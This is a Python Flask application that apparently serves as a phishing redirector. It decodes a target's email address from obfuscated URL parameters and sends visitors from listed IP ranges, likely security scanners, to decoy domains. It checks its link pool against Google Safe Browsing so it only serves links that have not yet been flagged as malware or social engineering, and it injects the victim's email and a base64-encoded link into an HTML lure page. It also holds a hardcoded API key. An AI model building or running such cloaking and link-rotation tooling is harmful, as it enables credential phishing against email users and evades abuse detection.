from flask import Flask, request, redirect, send_file, jsonify
import requests
import random
import base64
import os
import re  # For email validation
import struct
import socket

app = Flask(__name__)

# Your Google Safe Browsing API key
API_KEY = 'AIzaSyDyOPmvplb1WtijK21xb4ApvRZwCxtsA18'
# Path to the txt file with the links
LINKS_FILE_PATH = 'links.txt'
# Path to the raw HTML template
RAW_HTML_FILE_PATH = 'raw.html'
# Path to the final index HTML file
INDEX_HTML_FILE_PATH = 'index.html'
# Path to the IP blocking file
IPS_FILE_PATH = 'IPs.txt'
# Path to the file containing redirect URLs
REDIRECT_URLS_FILE_PATH = 'redirecturls.txt'


# Function to check if a URL is safe
def check_url_safety(api_key, url):
    api_url = "https://safebrowsing.googleapis.com/v4/threatMatches:find"
    payload = {
        "client": {
            "clientId": "yourcompanyname",
            "clientVersion": "1.5.2"
        },
        "threatInfo": {
            "threatTypes": ["MALWARE", "SOCIAL_ENGINEERING"],
            "platformTypes": ["ANY_PLATFORM"],
            "threatEntryTypes": ["URL"],
            "threatEntries": [
                {"url": url}
            ]
        }
    }
    params = {'key': api_key}
    response = requests.post(api_url, json=payload, params=params)
    result = response.json()

    # If any matches are found, the URL is considered deceptive
    if "matches" in result:
        return False
    return True


# Function to read links from the txt file
def get_links(file_path):
    with open(file_path, 'r') as file:
        # Filter links to include only those that start with 'https://'
        return [line.strip() for line in file.readlines() if line.strip().startswith('https://')]


# Function to update the raw HTML file with the Base64-encoded safe link
def update_html_with_av_pv_and_link(raw_html_file, index_html_file, iav, ipv, safe_link):
    # Ensure the link includes a protocol (http:// or https://)
    if not safe_link.startswith('http://') and not safe_link.startswith('https://'):
        safe_link = 'https://' + safe_link  # Default to https if no protocol is provided

    # Convert the safe link to Base64
    safe_link_base64 = base64.b64encode(safe_link.encode()).decode()

    with open(raw_html_file, 'r') as raw_file:
        raw_html = raw_file.read()
    
    updated_html = raw_html.replace("[[av]]", iav).replace("[[pv]]", ipv).replace("[[link]]", safe_link_base64)
    
    # Write to index.html (overwrites the existing file if present)
    with open(index_html_file, 'w') as index_file:
        index_file.write(updated_html)


# Function to get the list of blocked IPs from a file
def get_blocked_ips(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]


# Function to get a random redirect URL from the file
def get_random_redirect_url(file_path):
    with open(file_path, 'r') as file:
        urls = [line.strip() for line in file.readlines()]
    return random.choice(urls) if urls else None

def is_valid_email(email):
    # Simple regex to validate email format
    email_regex = r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$'
    return re.match(email_regex, email) is not None

# Convert IPv4 address to long integer format
def ip2long(ip):
    return struct.unpack("!L", socket.inet_aton(ip))[0]

# Convert long integer to IPv4 address
def long2ip(val):
    return socket.inet_ntoa(struct.pack("!L", val))

# Function to check if an IP address is in a specific range
def ip_in_range(ip, range):
    if '.' in ip:  # IPv4
        if '/' in range:
            # CIDR format (e.g., 1.2.3.4/24 or 1.2.3.4/255.255.255.0)
            network, netmask = range.split('/')
            if '.' in netmask:
                # If netmask is in dotted decimal format
                netmask_dec = ip2long(netmask)
            else:
                # CIDR notation (e.g., /24)
                netmask_dec = ~(2**(32-int(netmask)) - 1)
            return (ip2long(ip) & netmask_dec) == (ip2long(network) & netmask_dec)
        elif '-' in range:
            # Start-End IP format (e.g., 1.2.3.0-1.2.3.255)
            start_ip, end_ip = range.split('-')
            return ip2long(start_ip) <= ip2long(ip) <= ip2long(end_ip)
        elif '*' in range:
            # Wildcard format (e.g., 1.2.3.*)
            range_start = range.replace('*', '0')
            range_end = range.replace('*', '255')
            return ip2long(range_start) <= ip2long(ip) <= ip2long(range_end)
        else:
            return False
    elif ':' in ip:  # IPv6 (you can expand it if needed)
        # Handle IPv6 logic here
        pass

    return False

# Function to get blocked IP ranges from the ips.txt file
def get_blocked_ip_ranges(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

# Function to check if the requester's IP is blocked
def is_ip_blocked(requester_ip):
    blocked_ip_ranges = get_blocked_ip_ranges(IPS_FILE_PATH)
    for ip_range in blocked_ip_ranges:
        if ip_in_range(requester_ip, ip_range):
            return True
    return False

@app.before_request
def block_ip():
    # Get the client IP address from X-Forwarded-For or fallback to remote_addr
    if request.headers.getlist("X-Forwarded-For"):
        # Split the 'X-Forwarded-For' string to extract the first IP address
        requester_ip = request.headers.getlist("X-Forwarded-For")[0].split(',')[0].strip()
    else:
        requester_ip = request.remote_addr

    # Check if the requester's IP is in the blocked IP ranges
    if is_ip_blocked(requester_ip):
        random_domain = get_random_redirect_url(REDIRECT_URLS_FILE_PATH)
        REDIRECT_URL = 'https://' + 'www.' + random_domain
        return redirect(REDIRECT_URL)


@app.route('/')
def check_links_and_serve():
    # Retrieve 'trexxcoz' and 'coztrexx' parameters from URL
    trexxcoz = request.args.get('trexxcoz')
    coztrexx = request.args.get('coztrexx')

    if not trexxcoz or not coztrexx:
        # If parameters are missing, redirect to REDIRECT_URL
        random_domain = get_random_redirect_url(REDIRECT_URLS_FILE_PATH)
        REDIRECT_URL = 'https://' + 'www.' + random_domain
        return redirect(REDIRECT_URL)

    # Decode Base64 parameters to string
    try:
        ipv = base64.b64decode(trexxcoz).decode('utf-8')
        iav = base64.b64decode(coztrexx).decode('utf-8')
    except Exception as e:
        # If decoding fails, redirect to REDIRECT_URL
        random_domain = get_random_redirect_url(REDIRECT_URLS_FILE_PATH)
        REDIRECT_URL = 'https://' + 'www.' + random_domain
        return redirect(REDIRECT_URL)

    # Construct the email address from the decoded parameters
    vmail = f"{iav}@{ipv}"

    # Validate the constructed email
    if not is_valid_email(vmail):
        # If the email is not valid, redirect to REDIRECT_URL
        random_domain = get_random_redirect_url(REDIRECT_URLS_FILE_PATH)
        REDIRECT_URL = 'https://' + 'www.' + random_domain
        return redirect(REDIRECT_URL)

    # If the email is valid, proceed to check the safe links
    links = get_links(LINKS_FILE_PATH)

    # Loop through the links and check their safety
    for link in links:
        if check_url_safety(API_KEY, link):
            # If a safe link is found, update the HTML with the Base64-encoded link and serve it
            update_html_with_av_pv_and_link(RAW_HTML_FILE_PATH, INDEX_HTML_FILE_PATH, iav, ipv, link)
            return send_file(INDEX_HTML_FILE_PATH)
        else:
            # Remove the unsafe link and continue with the next one
            links.remove(link)

    return "No safe links found!"

@app.route('/update_links', methods=['POST'])
def update_links():
    if 'file' not in request.files:
        return jsonify({"error": "No file part"}), 400

    file = request.files['file']

    if file.filename == '':
        return jsonify({"error": "No selected file"}), 400

    # Read the file and append new links to links.txt
    new_links = file.read().decode('utf-8').strip().splitlines()
    
    existing_links = set()
    if os.path.exists(LINKS_FILE_PATH):
        with open(LINKS_FILE_PATH, 'r') as links_file:
            existing_links = set(links_file.read().splitlines())

    new_links_count = 0
    with open(LINKS_FILE_PATH, 'a') as links_file:
        for link in new_links:
            if link and link not in existing_links:
                links_file.write(link + '\n')
                new_links_count += 1

    # Count total links in links.txt
    total_links_count = len(existing_links) + new_links_count

    return jsonify({
        "message": "Links updated successfully!",
        "new_links_count": new_links_count,
        "total_links_count": total_links_count
    }), 200


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
